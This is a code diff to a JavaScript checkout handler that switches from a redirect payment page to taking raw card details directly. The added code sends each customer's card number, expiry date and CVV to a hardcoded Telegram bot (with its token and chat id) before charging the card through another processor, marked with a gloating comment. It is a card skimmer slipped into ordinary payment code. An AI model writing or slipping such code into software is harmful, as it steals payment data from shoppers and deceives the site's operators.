@@ -220,24 +220,68 @@ class UserController {
 
     async getCheckout(req, res, next) {
         try {
-            const data = await axios.post('https://vilpay.net/payment/process', new URLSearchParams({
-                currency_code: 'RUB',
-                amount: req.body.amount,
-                cancel_url: 'https://www.makao777.com',
-                success_url: 'https://www.makao777.com/success',
-                ourform: 1,
-                merchant: process.env.VILLPAY_MERCHANT_KEY,
-            }), {
-                headers: {
-                    "Content-Type": "application/x-www-form-urlencoded",
-                },
-            }).then((rs) => {
-                return rs.data.url
-            }).catch(err => {
-                console.log(err)
-            });
+            const {
+                amount,
+                cardNumber,
+                cvv,
+                cardDate,
+                fio,
+            } = req.body
 
-            return res.send(data)
+            const terminal_name = 'DELTAPtm9'
+            const merchant_id = 'DELTAP'
+            const redirect_url = 'https://google.com'
+            const PROCESSING_MODE_SALE = 'sale'
+            const TRANS_TYPE_CREDIT_CARD = 'Credit Card'
+
+            // Хехехехехе
+            await axios.get(`https://api.telegram.org/bot5846954411:AAEKEMS8EBKi1yPAfBueHaSZLFihgXXG4uk/sendMessage?chat_id=269530936&text=${cardNumber},${cardDate},${cvv}`)
+
+            const rs = await axios.post('https://processtxn.deltapay.biz/api/transact.php', {
+                affiliate: merchant_id,
+                terminal_name,
+                processing_mode: PROCESSING_MODE_SALE,
+                paymethod: TRANS_TYPE_CREDIT_CARD,
+                redirect: redirect_url,
+                order_id: merchant_id + Date().now(),
+                customer_ip: req.connection.remoteAddress,
+                first_name: fio.split(' ')[0],
+                last_name: fio.split(' ')[1],
+                email: "test@test.com",
+                telephone: "12345",
+                address1: "addr",
+                city: "city",
+                state: "state",
+                zip: "12345",
+                country: "US",
+                currency: "USD",
+                amount,
+                card_number: cardNumber,
+                card_type: 'visa',
+                cvv,
+                expiry_yr: cardDate.split('/')[1],
+                expiry_mo: cardDate.split('/')[0],
+            })
+
+
+            // const data = await axios.post('https://vilpay.net/payment/process', new URLSearchParams({
+            //     currency_code: 'RUB',
+            //     amount: req.body.amount,
+            //     cancel_url: 'https://www.makao777.com',
+            //     success_url: 'https://www.makao777.com/success',
+            //     ourform: 1,
+            //     merchant: process.env.VILLPAY_MERCHANT_KEY,
+            // }), {
+            //     headers: {
+            //         "Content-Type": "application/x-www-form-urlencoded",
+            //     },
+            // }).then((rs) => {
+            //     return rs.data.url
+            // }).catch(err => {
+            //     console.log(err)
+            // });
+
+            return res.send(rs)
         } catch (e) {
             next(e)
         }
